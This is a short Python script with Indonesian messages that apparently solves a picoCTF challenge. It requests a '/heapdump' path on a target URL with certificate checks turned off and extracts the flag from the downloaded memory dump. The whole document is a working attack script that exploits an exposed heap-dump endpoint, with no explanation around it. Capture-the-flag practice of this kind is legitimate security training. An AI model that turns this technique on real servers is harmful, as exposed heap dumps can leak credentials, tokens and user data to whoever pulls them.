import re
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    if len(sys.argv) != 2:
        print("Usage: masukkan url web <url>")
        sys.exit(1)
    url = sys.argv[1]
    s = requests.Session()
    url_head = url + 'heapdump'
    r = s.get(url_head, verify=False)
    if r.status_code == 200:
        print("sudah Download")
        #print(r.text)
        flag = re.search(r'picoCTF{.*?}', r.text)
        print(flag.group(0))
        
    else:
        print("gagal Download")
    

if __name__ == "__main__":

    main()
